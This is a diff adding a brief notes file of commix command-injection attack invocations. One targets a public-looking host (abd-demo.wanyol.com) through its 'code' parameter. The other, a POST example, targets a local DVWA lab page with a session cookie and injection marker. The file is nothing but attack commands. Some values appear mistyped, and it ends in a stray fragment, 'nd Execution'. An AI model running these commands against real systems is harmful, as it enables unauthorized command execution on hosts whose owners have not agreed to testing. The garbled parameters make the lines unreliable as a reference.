@@ -1,0 +1,5 @@
+commix -u https://abd-demo.wanyol.com/index?code=csc.index  -p code= -H --timeout=5 --level=1 --smart
+
+post request 
+
+commix -u 'http://192.168.92.129/dvwa/vulnerabilities/exec/' --cookie="security-low; PHPSESSID=cb1868f0c5c16fda3243f4c56f836228" --data="ip-INJECT_HERE&submit=submit" nd Execution
